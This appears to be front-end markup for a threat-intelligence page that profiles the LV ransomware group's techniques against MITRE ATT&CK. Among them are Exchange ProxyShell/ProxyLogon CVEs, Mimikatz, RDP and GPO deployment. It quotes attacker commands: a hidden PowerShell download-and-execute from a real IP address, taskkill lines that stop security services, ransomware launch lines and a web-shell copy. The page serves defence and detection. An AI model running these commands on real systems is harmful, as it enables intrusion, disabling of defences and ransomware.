...
- CVE-2021-27065
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using powershell to download files</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1078.002</span>
								<span className='text-gray-900 fw-semibold mb-1 fs-7'>Valid Accounts: Domain Accounts</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using AD accounts to establish persistence</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using domain administrator account to gain privilege</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1036.004</span>
								<span className='text-gray-900 fw-semibold mb-1 fs-7'>Masquerading: Masquerade Task or Service</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Make GoogleUpdateUX schedule to look them like legitimate</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using Mimikatz to dump account crdentials</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								...
								<span className='text-gray-900 fw-semibold mb-1 fs-7'>Network Service Discover</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using tools such as Netscan to find network service</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-gray-100 fs-8 fw-bold me-2'>T1021.001</span>
								<span className='text-gray-900 fw-semibold mb-1 fs-7'>Remote Services: Remote Desktop Protocol</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using RDP to move laterally</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using uitilities such as IEX().downloadString() to download tools</div>
								</div>
							</div>
						</div>
					</td>          
				...
				<tr className=''>				
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using command shell to execute bat files</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Deploying web shell to establish persistence</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using encrypted ransomware binary to avoid detection</div>
								</div>
							</div>
						</div>
					</td>          
				...
				<tr className=''>				
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Modifing the registry keys to execute the malicious files when user log in</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Create a Group Policy Object for deploying the malware to bypass execution policies</div>
								</div>
							</div>
						</div>
					</td>          
				...
				<tr className=''>				
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Using batch file LV made, LV remove the security services</div>
								</div>
							</div>
						</div>
					</td>          
				...
				<tr className=''>				
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>LV delete their artifacts</div>
								</div>
							</div>
						</div>
					</td>          
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV exploits ProxyShell and ProxyLogon vulnerabilities in MS Exchange servers to gain initial access.</div>
					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
					<div className='fs-4 fw-semebold pb-5 ms-5 text-gray-900 fst-italic'>
						<div>&deg;&nbsp;CVE-2021-34473 (CSSS:9.8) proxyshell</div>
					
						<div>&deg;&nbsp;CVE-2021-34523 (CVSS:9.8) proxyshell</div>
					
						<div>&deg;&nbsp;CVE-2021-31207 (CVSS:7.2) proxyshell</div>
					
						<div>&deg;&nbsp;CVE-2021-26855 (CVSS:9.8) proxylogon</div>
					
						<div>&deg;&nbsp;CVE-2021-27065 (CVSS:7.8) proxylogon</div>
					</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV uses PowerShell for several purposes, such as downloading other malicious files</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File "IEX ((new-object net.webclient).downloadstring('http://185.82.219.201/sss'))"    </div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV executes .bat files for purposes such as deploying ransomware on target machines and disabling their security mechanisms.</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;taskkill /f /im dsa.exe</div>
							<div>&deg;&nbsp;taskkill /f /im ds_monitor.exe</div>
							<div>&deg;&nbsp;taskkill /f /im Notifier.exe</div>
							<div>&deg;&nbsp;start \location\test\setup_.exe -path c:\</div>
							<div>&deg;&nbsp;start \location\test\setup_.exe -path d:\</div>
							<div>&deg;&nbsp;start \location\test\setup_.exe -path e:\</div>
							<div>&deg;&nbsp;start \location\test\setup_.exe -path f:\</div>
							<div>&deg;&nbsp;start \location\test\setup_.exe -path g:\</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1078.002</span>
						<span className='text-gray-900 fw-bold mb-1 fs-3'>- Valid Accounts: Domain Accounts</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV establishes persistence by using compromised user accounts in the Active Directory</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV deploys a web shell to compromised computers as a gateway into the victim's network</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;xcopy /I /Y #web_shell #web_shell_path</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV group modifies the registry keys below to execute a malicious PowerShell script whenever a user logs in</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV gains domain admin privileges via the compromised credentials for the domain administrator account</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1036.004</span>
						<span className='text-gray-900 fw-bold mb-1 fs-3'>- Masquerading: Masquerade Task or Service</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV ransomware names its malicious scheduled task as 'GoogleUpdateUX' to make them appear legitimate.</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV stores the ransomware binary in RC-4 encrypted format within a section with the name 'enc' in order to avoid signature-based detection</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV creates a malicious Group Policy Object that schedules the tasks for deploying their malware to bypass execution policies</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV executes the 'install.bat' file on target computers in order to disable security services</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV deleted their artifacts from the victim's network after encrypting files to minimize their footprint and avoid forensic analysis</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV uses Mimikatz to dump account credentials</div>
			...
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						...
						<span className='text-gray-900 fw-bold mb-1 fs-3'>- Network Service Discover</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV uses tools such as Netscan and Advanced Port Scanner to discover services in the network</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-gray-100 fs-5 fw-bold me-1'>T1021.001</span>
						<span className='text-gray-900 fw-bold mb-1 fs-3'>- Remote Services: Remote Desktop Protocol</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV moves laterally to other hosts in the victim's network via RDP and the compromised domain admin credentials</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV downloads third-party tools they need to the compromised network via built-in utilities such as IEX().downloadString()</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;IEX(New-Object Net.WebClient).downloadString()</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LV ransomware encrypts victims' files and appends them with extensions such as 'l7dm4566n'</div>
